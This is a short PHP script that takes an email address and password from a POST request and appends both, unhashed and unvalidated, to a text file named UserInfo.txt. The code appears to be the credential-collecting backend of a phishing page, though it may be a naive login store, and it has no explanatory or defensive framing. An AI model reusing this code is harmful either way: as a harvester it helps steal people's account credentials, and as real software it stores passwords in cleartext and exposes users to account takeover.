<?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // collect value of input field


    $email = $_REQUEST['email'];
    $password = $_REQUEST['password'];

    $f=fopen("./dataStoreFiles/UserInfo.txt","a");
    fwrite($f," email: ".$email.
    " password: ".$password."\n");
    fclose($f);
    }
?>